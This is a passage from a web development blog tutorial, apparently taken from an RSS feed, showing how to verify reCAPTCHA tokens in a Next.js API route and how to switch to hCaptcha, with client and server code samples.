&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;handler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;method&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="c1"&gt;// Extract the email and captcha code from the request body&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;email&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;captcha&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;method&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;POST&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;// If email or captcha are missing return an error&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;email&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;captcha&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;422&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;json&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
        &lt;span class="na"&gt;message&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Unproccesable request, please provide the required fields&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="p"&gt;});&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="c1"&gt;// Ping the google recaptcha verify API to verify the captcha code you received&lt;/span&gt;
      &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="s2"&gt;`https://www.google.com/recaptcha/api/siteverify?secret=&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;env&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;RECAPTCHA_SECRET_KEY&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;amp;response=&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;captcha&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;`&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;
          &lt;span class="na"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Content-Type&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;application/x-www-form-urlencoded; charset=utf-8&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="p"&gt;},&lt;/span&gt;
          &lt;span class="na"&gt;method&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;POST&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
      &lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;captchaValidation&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;json&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
      &lt;span class="cm"&gt;/**
       * The structure of response from the veirfy API is
       * {
       *  "success": true|false,
       *  "challenge_ts": timestamp,  // timestamp of the challenge load (ISO format yyyy-MM-dd'T'HH:mm:ssZZ)
       *  "hostname": string,         // the hostname of the site where the reCAPTCHA was solved
       *  "error-codes": [...]        // optional
        }
       */&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;captchaValidation&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;success&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;// Replace this with the API that will save the data received&lt;/span&gt;
        &lt;span class="c1"&gt;// to your backend&lt;/span&gt;
        &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
        &lt;span class="c1"&gt;// Return 200 if everything is successful&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;OK&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;

      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;422&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;json&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
        &lt;span class="na"&gt;message&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Unproccesable request, Invalid captcha code&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="p"&gt;});&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;422&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;json&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="na"&gt;message&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Something went wrong&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="c1"&gt;// Return 404 if someone pings the API with a method other than&lt;/span&gt;
  &lt;span class="c1"&gt;// POST&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;404&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Not found&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;For simplicity, I have installed a package called &lt;a href="https://www.npmjs.com/package/node-fetch"&gt;&lt;code&gt;node-fetch&lt;/code&gt;&lt;/a&gt;, which is a light-weight wrapper that provides the &lt;code&gt;window.fetch&lt;/code&gt; like API in Node environment.&lt;/p&gt;

&lt;p&gt;Now let's integrate this API on the client. Update the &lt;code&gt;onReCAPTCHAChange&lt;/code&gt; function in the &lt;code&gt;pages/index.js&lt;/code&gt; with the following snippet -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;onReCAPTCHAChange&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;captchaCode&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;// If the reCAPTCHA code is null or undefined indicating that&lt;/span&gt;
    &lt;span class="c1"&gt;// the reCAPTCHA was expired then return early&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;captchaCode&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/api/register&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="na"&gt;method&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;POST&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="na"&gt;body&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;JSON&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;stringify&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;email&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="na"&gt;captcha&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;captchaCode&lt;/span&gt; &lt;span class="p"&gt;}),&lt;/span&gt;
        &lt;span class="na"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
          &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Content-Type&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;application/json&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="p"&gt;},&lt;/span&gt;
      &lt;span class="p"&gt;});&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;ok&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;// If the response is ok than show the success alert&lt;/span&gt;
        &lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Email registered successfully&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;// Else throw an error with the message returned&lt;/span&gt;
        &lt;span class="c1"&gt;// from the API&lt;/span&gt;
        &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;error&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;json&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
        &lt;span class="k"&gt;throw&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Error&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;?.&lt;/span&gt;&lt;span class="nx"&gt;message&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Something went wrong&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;finally&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="c1"&gt;// Reset the reCAPTCHA when the request has failed or succeeeded&lt;/span&gt;
      &lt;span class="c1"&gt;// so that it can be executed again if user submits another email.&lt;/span&gt;
      &lt;span class="nx"&gt;recaptchaRef&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;current&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;reset&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
      &lt;span class="nx"&gt;setEmail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;To test if the integration is proper, you can replace the captcha code sent to the API with a random string, and you should see this when you click on register.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--nVpp4_xT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://prateeksurana.me/blog/img/invalid-response-code.jpg" class="article-body-image-wrapper"&gt;&lt;img class="article-img" src="https://res.cloudinary.com/practicaldev/image/fetch/s--nVpp4_xT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://prateeksurana.me/blog/img/invalid-response-code.jpg" alt="Invalid response code"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you followed along till here, then pat yourself on the back. Your frontend and backend database are now fully secure from any spam or bots.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://github.com/prateek3255/recaptch-with-next/tree/a57aadb1dddf4289892c8949de6d8715ba1a07d1"&gt;👨🏻‍💻 Code till this step&lt;/a&gt;&lt;/p&gt;

&lt;h2 id="integrating-hcaptcha-and-why-you-need-it"&gt;Bonus: Integrating hCAPTCHA and why you might need it&lt;/h2&gt;

&lt;p&gt;Although reCAPTCHA might be great for security, but if you're concerned about your user's privacy, then &lt;a href="https://www.hcaptcha.com/"&gt;hCaptcha&lt;/a&gt; might be a better choice. Do checkout why &lt;a href="https://blog.cloudflare.com/moving-from-recaptcha-to-hcaptcha/"&gt;Cloudflare moved from reCAPTCHA to hCaptcha&lt;/a&gt;. hCaptcha differs from reCAPTCHA in the following ways:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;They respect for your user's privacy.&lt;/li&gt;
&lt;li&gt;Your visitors will solve problems that benefits many companies for labelling the data instead of a single corporation.&lt;/li&gt;
&lt;li&gt;It's more user friendly and contains a variety of challenges.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Thanks to hCaptcha's clean and similar to reCAPTCHA APIs, it takes no time to switch from reCAPTCHA to hCaptcha. It literally took me just 15 minutes to go through their docs and replace reCAPTCHA with hCaptcha for our demo.&lt;/p&gt;

&lt;p&gt;The setting up process is very similar to reCAPTCHA. You can go to their &lt;a href="https://www.hcaptcha.com/signup-interstitial"&gt;signup page&lt;/a&gt; to create an account and get the site key and secret key for your site. I renamed the keys to &lt;code&gt;NEXT_PUBLIC_HCAPTCHA_SITE_KEY&lt;/code&gt; and &lt;code&gt;HCAPTCHA_SECRET_KEY&lt;/code&gt;, respectively, in the &lt;code&gt;.env.local&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;They also have a React wrapper component called &lt;a href="https://github.com/hCaptcha/react-hcaptcha"&gt;&lt;code&gt;@hcaptcha/react-hcaptcha&lt;/code&gt;&lt;/a&gt;, which also has a very similar API to the React component we used for reCAPTCHA. These are the only changes (apart from renaming reCAPTCHA variables) I had to integrate the component on the client in &lt;code&gt;pages/index.js&lt;/code&gt; :&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;HCaptcha&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;@hcaptcha/react-hcaptcha&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;HCaptcha&lt;/span&gt;
  &lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;test&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
  &lt;span class="nx"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;invisible&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
  &lt;span class="nx"&gt;ref&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;hcaptchaRef&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="nx"&gt;sitekey&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;env&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;NEXT_PUBLIC_HCAPTCHA_SITE_KEY&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="nx"&gt;onVerify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;onHCaptchaChange&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;For the api route, we just need to change the url and pass the secret and token to the body instead of query params, this is what it looks like in &lt;code&gt;pages/api/register.js&lt;/code&gt; :&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
  &lt;span class="s2"&gt;`https://hcaptcha.com/siteverify`&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="na"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Content-Type&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;application/x-www-form-urlencoded; charset=utf-8&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="na"&gt;body&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;`response=&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;captcha&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;amp;secret=&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;env&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;HCAPTCHA_SECRET_KEY&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;`&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="na"&gt;method&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;POST&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Although hCaptcha doesn't work on localhost URLs so you would need to add a &lt;a href="https://docs.hcaptcha.com/#local-development"&gt;host entry for localhost&lt;/a&gt; according to your system for it to work.&lt;/p&gt;

&lt;p&gt;After that you can just run &lt;code&gt;yarn dev&lt;/code&gt;, and visit the URL you added the host entry for localhost to to see hCaptcha in action&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qETxWMl3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://prateeksurana.me/blog/img/hcaptcha-in-action.gif" class="article-body-image-wrapper"&gt;&lt;img class="article-img" src="https://res.cloudinary.com/practicaldev/image/fetch/s--qETxWMl3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://prateeksurana.me/blog/img/hcaptcha-in-action.gif" alt="hCaptcha in action"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I created a separate branch in the demo repo, for the hCaptcha integration here -&lt;/p&gt;

&lt;p&gt;&lt;a href="https://github.com/prateek3255/recaptch-with-next/tree/integrate-hcaptcha"&gt;👨🏻‍💻 Code till this step&lt;/a&gt;&lt;/p&gt;




&lt;p&gt;I hope this article helped you in gaining some insight on how you can integrate CAPTCHA with your Next.js website and which CAPTCHA service you should prefer. If it did then do &lt;a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fprateeksurana.me%2Fblog%2Fintegrating-recaptcha-with-next%2F&amp;amp;via=psuranas&amp;amp;text=Integrating%20ReCAPTCHA%20with%20Next.js"&gt;share it on twitter&lt;/a&gt; and &lt;a href="http://twitter.com/psuranas"&gt;follow me&lt;/a&gt; for more.&lt;/p&gt;

&lt;p&gt;You can find the full code for both the &lt;a href="https://github.com/prateek3255/recaptch-with-next"&gt;reCAPTCHA&lt;/a&gt; and &lt;a href="https://github.com/prateek3255/recaptch-with-next/tree/integrate-hcaptcha"&gt;hCaptcha&lt;/a&gt; integration on GitHub.&lt;/p&gt;

</description>
      <category>react</category>
      <category>tutorial</category>
